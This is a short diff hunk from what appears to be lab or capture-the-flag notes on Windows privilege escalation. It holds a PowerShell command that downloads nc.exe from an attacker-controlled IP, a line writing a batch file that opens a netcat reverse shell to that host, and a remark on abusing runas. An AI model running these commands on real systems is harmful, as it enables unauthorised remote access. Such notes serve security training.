@@ -18,7 +18,7 @@ cd Desktop
 
 powershell -c "$client = New-Object Net.WebClient; $client.DownloadFile('http://10.10.14.19:8000/nc.exe', 'nc.exe')"
 
-echo c:\Users\security\Desktop\nc.exe 10.10.14.19 6789 -e cmd.exe > reverse.ba
+echo c:\Users\security\Desktop\nc.exe 10.10.14.19 6789 -e cmd.exe > reverse.bat
 
 #Runas can be exploited if net user Administrator have "No Password Required Option" enabled
 
